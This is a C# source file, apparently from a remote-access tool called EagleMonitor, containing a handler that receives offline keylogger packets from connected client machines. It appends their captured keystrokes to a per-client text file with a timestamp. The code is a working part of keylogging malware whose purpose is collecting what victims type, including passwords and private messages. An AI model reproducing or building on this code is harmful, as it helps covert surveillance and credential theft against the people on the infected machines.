using EagleMonitor.Networking;
using PacketLib.Packet;
using System;
using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class KeylogOfflinePacketHandler
    {
        public KeylogOfflinePacketHandler(KeylogOfflinePacket keylogOfflinePacket, ClientHandler clientHandler)
        {
            try
            {
                Directory.CreateDirectory(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\");
                File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + DateTime.Now.ToString().Replace(":", "") + "\n--------------------------------------------\n");
                keylogOfflinePacket = null;
                return;
            }
            catch { }
        }
    }
}
